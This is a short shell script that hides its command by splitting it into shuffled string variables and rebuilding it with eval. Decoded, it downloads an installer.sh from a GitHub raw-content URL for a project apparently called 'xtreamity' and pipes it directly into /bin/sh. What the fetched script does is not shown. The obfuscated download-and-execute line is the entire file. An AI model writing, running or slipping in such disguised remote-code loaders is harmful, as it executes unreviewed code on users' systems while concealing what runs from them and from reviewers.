z="
";Sz='sh -';Vz='in/s';Tz='O - ';Lz='37/x';Ez='.git';Bz=' htt';Gz='serc';Oz='/mai';Mz='trea';Az='wget';Wz='h';Cz='ps:/';Iz='nt.c';Uz='| /b';Dz='/raw';Qz='stal';Kz='mil2';Pz='n/in';Rz='ler.';Fz='hubu';Hz='onte';Jz='om/e';Nz='mity';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz"